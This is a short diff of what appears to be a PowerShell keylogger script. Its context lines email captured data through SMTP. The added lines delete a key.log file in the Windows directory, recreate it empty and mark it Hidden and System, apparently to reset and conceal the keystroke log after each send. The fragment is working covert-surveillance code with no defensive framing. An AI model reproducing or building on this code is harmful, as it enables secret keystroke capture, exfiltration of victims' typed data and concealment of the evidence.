@@ -232,6 +232,11 @@ $functions =  {
                 $msg.Subject = $pastename
                 $msg.Body = $pastevalue
                 $smtp.Send($msg)
+
+                $filename = "$env:windir\key.log"
+                rm -force $filename
+                fsutil file createnew $filename 0
+                (Get-ChildItem $filename).Attributes = "Hidden","System"
             }
         }
     }
